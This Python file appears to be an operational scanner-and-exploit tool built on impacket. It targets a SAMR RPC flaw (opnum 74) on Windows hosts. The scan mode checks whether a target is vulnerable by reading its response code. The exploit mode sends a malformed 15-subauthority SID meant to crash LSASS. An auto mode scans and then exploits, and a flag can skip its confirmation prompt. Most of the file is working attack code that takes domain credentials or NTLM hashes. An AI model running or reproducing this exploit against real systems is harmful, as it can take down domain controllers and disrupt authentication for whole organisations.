#!/usr/bin/env python3
"""Merged ReuseRupture scanner/exploit command-line tool.

This file intentionally keeps the SAMR opnum 74 request structures and SID
construction from the supplied scanner and exploit scripts. The refactor only
normalizes argument parsing, authentication handling, output, and exit codes.
"""

from __future__ import annotations

import argparse
import getpass
import json
import sys
from dataclasses import dataclass

from impacket.dcerpc.v5 import samr, transport
from impacket.dcerpc.v5.dtypes import BOOL, RPC_SID, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.examples.utils import parse_target
from impacket.smb import SessionError as SMB1SessionError
from impacket.smb3 import SessionError as SMB3SessionError
from impacket.smbconnection import SessionError as SMBConnectionSessionError


STATUS_INVALID_PARAMETER = 0xC000000D
STATUS_OBJECT_NAME_INVALID = 0xC0000033
STATUS_PIPE_BROKEN = 0xC000014B
SAFE_SUBAUTHORITY_COUNT = 6
EXPLOIT_SUBAUTHORITY_COUNT = 15


class SamrValidateComputerAccountReuseAttempt(NDRCALL):
    opnum = 74
    structure = (
        ("ServerHandle", samr.SAMPR_HANDLE),
        ("ComputerSid", RPC_SID),
    )


class SamrValidateComputerAccountReuseAttemptResponse(NDRCALL):
    structure = (
        ("Result", BOOL),
        ("ErrorCode", ULONG),
    )


@dataclass
class Credentials:
    target: str
    domain: str
    username: str
    password: str
    lmhash: str = ""
    nthash: str = ""


def parse_hashes(value: str | None) -> tuple[str, str]:
    if not value:
        return "", ""
    if ":" not in value:
        raise ValueError("--hashes must use LMHASH:NTHASH format")
    return tuple(value.split(":", 1))  # type: ignore[return-value]


def build_sid(count: int) -> RPC_SID:
    authorities = [21] + list(range(1, count))
    sid = RPC_SID()
    sid.fromCanonical("S-1-5-" + "-".join(map(str, authorities)))
    return sid


def build_credentials(args: argparse.Namespace) -> Credentials:
    domain, username, password, address = parse_target(args.target)
    if args.domain:
        domain = args.domain
    if args.username:
        username = args.username
    if args.password is not None:
        password = args.password
    if not username:
        raise ValueError("an authenticated domain account is required")
    lmhash, nthash = parse_hashes(args.hashes)
    if password == "" and not args.hashes:
        password = getpass.getpass(f"Password for {domain}/{username}@{address}: ")
    return Credentials(
        target=address,
        domain=domain,
        username=username,
        password=password,
        lmhash=lmhash,
        nthash=nthash,
    )


def samr_connection(creds: Credentials, timeout: int):
    rpc_transport = transport.DCERPCTransportFactory(
        rf"ncacn_np:{creds.target}[\pipe\samr]"
    )
    rpc_transport.set_credentials(
        creds.username, creds.password, creds.domain, creds.lmhash, creds.nthash
    )
    rpc_transport.set_connect_timeout(timeout)
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
    connect = samr.hSamrConnect5(dce)
    return dce, connect["ServerHandle"]


def classify(status: int) -> tuple[str, str]:
    if status == STATUS_INVALID_PARAMETER:
        return "PATCHED_BEHAVIOR", "The validating helper rejected the safe 32-byte SID."
    if status == STATUS_OBJECT_NAME_INVALID:
        return (
            "VULNERABLE_BEHAVIOR",
            "The legacy helper accepted the safe 32-byte SID and continued to lookup.",
        )
    return "UNKNOWN", f"Unexpected NTSTATUS 0x{status:08x}; no vulnerability conclusion."


def scan(creds: Credentials, timeout: int) -> dict[str, object]:
    dce, server_handle = samr_connection(creds, timeout)
    request = SamrValidateComputerAccountReuseAttempt()
    request["ServerHandle"] = server_handle
    request["ComputerSid"] = build_sid(SAFE_SUBAUTHORITY_COUNT)
    response = dce.request(request, checkError=False)
    status = int(response["ErrorCode"])
    classification, reason = classify(status)
    return {
        "target": creds.target,
        "classification": classification,
        "ntstatus": f"0x{status:08x}",
        "result": int(response["Result"]),
        "safe_sid": "S-1-5-21-1-2-3-4-5",
        "safe_sid_length": 8 + 4 * SAFE_SUBAUTHORITY_COUNT,
        "reason": reason,
    }


def exploit(creds: Credentials, timeout: int) -> dict[str, object]:
    dce, server_handle = samr_connection(creds, timeout)
    request = SamrValidateComputerAccountReuseAttempt()
    request["ServerHandle"] = server_handle
    request["ComputerSid"] = build_sid(EXPLOIT_SUBAUTHORITY_COUNT)
    try:
        response = dce.request(request, checkError=False)
    except (SMB1SessionError, SMB3SessionError, SMBConnectionSessionError) as exc:
        if isinstance(exc, SMBConnectionSessionError):
            error_code = exc.getErrorCode()
        else:
            error_code = exc.get_error_code()
        if error_code == STATUS_PIPE_BROKEN:
            return {
                "target": creds.target,
                "status": "EXPLOIT_SENT_CRASH_OBSERVED",
                "reason": "SAMR pipe broke after the malformed SID request; LSASS crash is likely.",
            }
        raise

    status = int(response["ErrorCode"])
    if status == STATUS_INVALID_PARAMETER:
        return {
            "target": creds.target,
            "status": "PATCHED_REJECTED",
            "ntstatus": f"0x{status:08x}",
            "reason": "The malformed request was rejected; the target appears patched.",
        }
    return {
        "target": creds.target,
        "status": "UNKNOWN_RESPONSE",
        "ntstatus": f"0x{status:08x}",
        "reason": "The target returned an unexpected response.",
    }


def print_result(result: dict[str, object], as_json: bool = False) -> None:
    if as_json:
        print(json.dumps(result, sort_keys=True))
        return
    if "classification" in result:
        print(f"[{result['classification']}] {result['target']}")
        print(f"  NTSTATUS: {result.get('ntstatus', 'n/a')}")
        print(f"  Probe SID length: {result.get('safe_sid_length', 'n/a')} bytes")
        print(f"  Assessment: {result['reason']}")
    else:
        print(f"[{result['status']}] {result['target']}")
        if "ntstatus" in result:
            print(f"  NTSTATUS: {result['ntstatus']}")
        print(f"  Detail: {result['reason']}")


def confirm_or_exit(args: argparse.Namespace) -> None:
    if args.yes:
        return
    answer = input("Scanner reports vulnerable behavior. Send exploit now? [y/N] ")
    if answer.strip().lower() not in {"y", "yes"}:
        raise SystemExit(130)


def add_common(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "target",
        help="Impacket-style target: [[domain/]username[:password]@]<host>",
    )
    parser.add_argument("--domain", help="Override domain from target string")
    parser.add_argument("--username", help="Override username from target string")
    parser.add_argument("--password", help="Override password from target string; prompts when omitted")
    parser.add_argument("--hashes", metavar="LMHASH:NTHASH")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--json", action="store_true", help="Emit JSON result")
    parser.add_argument("--verbose", action="store_true")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="ReuseRupture SAMR scanner/exploit tool")
    sub = parser.add_subparsers(dest="command", required=True)
    scan_parser = sub.add_parser("scan", help="Run the safe behavioral scanner")
    add_common(scan_parser)
    exploit_parser = sub.add_parser("exploit", help="Send the supplied DoS request")
    add_common(exploit_parser)
    auto_parser = sub.add_parser("auto", help="Scan, confirm, then exploit")
    add_common(auto_parser)
    auto_parser.add_argument("--yes", action="store_true", help="Do not prompt before exploit")
    args = parser.parse_args(argv)

    try:
        creds = build_credentials(args)
        if args.command == "scan":
            result = scan(creds, args.timeout)
            print_result(result, args.json)
            return 1 if result["classification"] == "VULNERABLE_BEHAVIOR" else 0
        if args.command == "exploit":
            result = exploit(creds, args.timeout)
            print_result(result, args.json)
            return 0 if result["status"] == "EXPLOIT_SENT_CRASH_OBSERVED" else 1

        scan_result = scan(creds, args.timeout)
        print_result(scan_result, args.json)
        if scan_result["classification"] != "VULNERABLE_BEHAVIOR":
            print("Auto mode stopped because the scanner did not report vulnerable behavior.", file=sys.stderr)
            return 1
        confirm_or_exit(args)
        exploit_result = exploit(creds, args.timeout)
        print_result(exploit_result, args.json)
        return 0 if exploit_result["status"] == "EXPLOIT_SENT_CRASH_OBSERVED" else 1
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        if getattr(args, "verbose", False):
            raise
        print(f"ERROR: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
